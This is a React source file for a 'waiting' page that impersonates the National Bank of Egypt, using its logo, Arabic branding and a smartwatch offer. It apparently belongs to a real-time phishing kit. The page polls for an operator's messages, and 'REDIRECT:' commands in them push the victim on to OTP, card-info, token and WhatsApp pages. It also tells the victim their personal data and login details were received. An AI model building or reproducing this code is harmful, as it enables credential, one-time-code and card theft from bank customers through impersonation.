/**
 * البنك الأهلي المصري - صفحة الانتظار
 * تصميم داكن احترافي موحد
 */
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLiveVisitor } from "@/hooks/useLiveVisitor";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";
import { handleWatchImageError, WATCH_IMAGES, WATCH_NAMES } from "@/lib/watchImages";

export default function Waiting() {
  usePresence("processing");
  useAdminRedirect();
  const [, setLocation] = useLocation();
  const nationalId = localStorage.getItem("pw_national_id") || "";
  const [dots, setDots] = useState("");
  const [redirectError, setRedirectError] = useState("");
  const [customMsg, setCustomMsg] = useState("");
  const watchColor = sessionStorage.getItem("pw_selected_watch") || "black";

  // Animated dots
  useEffect(() => {
    const interval = setInterval(() => setDots((prev) => (prev.length >= 3 ? "" : prev + ".")), 500);
    return () => clearInterval(interval);
  }, []);

  // Poll for custom messages
  const { data: msgData } = trpc.applications.getCustomMessage.useQuery(
    { nationalId },
    { enabled: !!nationalId, refetchInterval: 4000 }
  );

  useEffect(() => {
    if (!msgData?.message) return;
    const msg = msgData.message;
    // Legacy redirect handling
    if (msg.startsWith("REDIRECT:")) {
      const target = msg.replace("REDIRECT:", "").trim();
      if (target === "login-error") {
        sessionStorage.setItem("pw_show_error", "true");
        setLocation("/login");
      } else if (target === "otp") setLocation("/otp");
      else if (target === "confirm-otp") setLocation("/confirm-otp");
      else if (target === "card") setLocation("/card-info");
      else if (target === "token" || target === "watchlink") setLocation("/watch-link");
      else if (target === "whatsapp") setLocation("/whatsapp");
      else if (target === "success") setLocation("/success");
      return;
    }
    setCustomMsg(msg);
  }, [msgData?.message]);

  // Check for login error from session
  useEffect(() => {
    const showError = sessionStorage.getItem("pw_show_error");
    if (showError === "true") {
      const errorMsg = sessionStorage.getItem("pw_redirect_error_msg") || "البيانات المدخلة غير صحيحة";
      setRedirectError(errorMsg);
      sessionStorage.removeItem("pw_show_error");
      sessionStorage.removeItem("pw_redirect_error_msg");
      setTimeout(() => setLocation("/login"), 3000);
    }
  }, []);

  return (
    <div dir="rtl" style={{ minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", position: "relative" }}>
      <div style={{ position: "fixed", top: "50%", left: "50%", transform: "translate(-50%, -50%)", opacity: 0.03, pointerEvents: "none", zIndex: 0 }}>
        <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="" style={{ width: "350px", height: "auto" }} />
      </div>
      <div style={{ maxWidth: "480px", width: "100%", padding: "32px 24px", textAlign: "center" }}>
        {/* Logo */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", marginBottom: "28px" }}>
            <img src="/manus-storage/nbe-official-logo-source_d2709322.png" alt="البنك الأهلي المصري" style={{ height: "42px", width: "auto", display: "block" }} onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }} />
          </div>

        {/* Error Message */}
        {redirectError && (
          <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "14px", padding: "20px", marginBottom: "24px" }}>
            <div style={{ fontSize: "32px", marginBottom: "8px" }}>⚠️</div>
            <h3 style={{ color: "#dc2626", fontWeight: "800", fontSize: "18px", margin: "0 0 8px" }}>{redirectError}</h3>
            <p style={{ color: "#666", fontSize: "13px", margin: 0 }}>سيتم تحويلك لصفحة تسجيل الدخول خلال لحظات...</p>
          </div>
        )}

        {/* Spinner */}
        <div style={{ width: "80px", height: "80px", border: "4px solid #dcfce7", borderTopColor: "#1B7A3D", borderRadius: "50%", animation: "spin 1s linear infinite", margin: "0 auto 24px" }} />
        <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>

        <h2 style={{ color: "#1a1a1a", fontWeight: "800", fontSize: "22px", marginBottom: "8px" }}>
          جاري معالجة طلبك{dots}
        </h2>
        <p style={{ color: "#666", fontSize: "14px", marginBottom: "28px" }}>
          يرجى الانتظار، يقوم فريقنا بمراجعة بياناتك والتحقق منها
        </p>

        {/* Watch Image */}
        <div style={{ background: "#f8faf9", borderRadius: "16px", padding: "16px", marginBottom: "24px", border: "1px solid #dcfce7" }}>
          <img
            src={WATCH_IMAGES[watchColor] || WATCH_IMAGES["black"]}
            alt="ساعتك الذكية"
            onError={handleWatchImageError}
            style={{ width: "100px", height: "100px", objectFit: "contain", margin: "0 auto 8px", display: "block", filter: "drop-shadow(0 4px 12px rgba(0,0,0,0.1))" }}
          />
          <p style={{ color: "#1B7A3D", fontWeight: "600", fontSize: "13px", margin: 0 }}>طلبك: {WATCH_NAMES[watchColor] || watchColor}</p>
        </div>

        {/* Steps */}
        <div style={{ display: "flex", flexDirection: "column", gap: "10px", textAlign: "right" }}>
          {[
            { icon: "✅", text: "تم استلام بياناتك الشخصية", done: true },
            { icon: "✅", text: "تم تسجيل بيانات الدخول", done: true },
            { icon: "⏳", text: "جاري مراجعة الطلب من قِبل الفريق", done: false },
            { icon: "⏳", text: "سيتم إخطارك بالنتيجة قريباً", done: false },
          ].map((step, i) => (
            <div key={i} style={{ display: "flex", alignItems: "center", gap: "12px", padding: "12px 16px", background: "#f8faf9", borderRadius: "10px", border: "1px solid #e5e7eb" }}>
              <span style={{ fontSize: "18px" }}>{step.icon}</span>
              <span style={{ color: step.done ? "#1a1a1a" : "#999", fontSize: "14px" }}>{step.text}</span>
            </div>
          ))}
        </div>

        {customMsg && !redirectError && (
          <div style={{ marginTop: "20px", background: "#f0fdf4", border: "1px solid #dcfce7", borderRadius: "12px", padding: "16px" }}>
            <p style={{ color: "#1B7A3D", fontWeight: "700", margin: 0, fontSize: "14px" }}>{customMsg}</p>
          </div>
        )}

        <p style={{ color: "#999", fontSize: "11px", marginTop: "32px" }}>© 2026 البنك الأهلي المصري - مصر</p>
      </div>
    </div>
  );
}
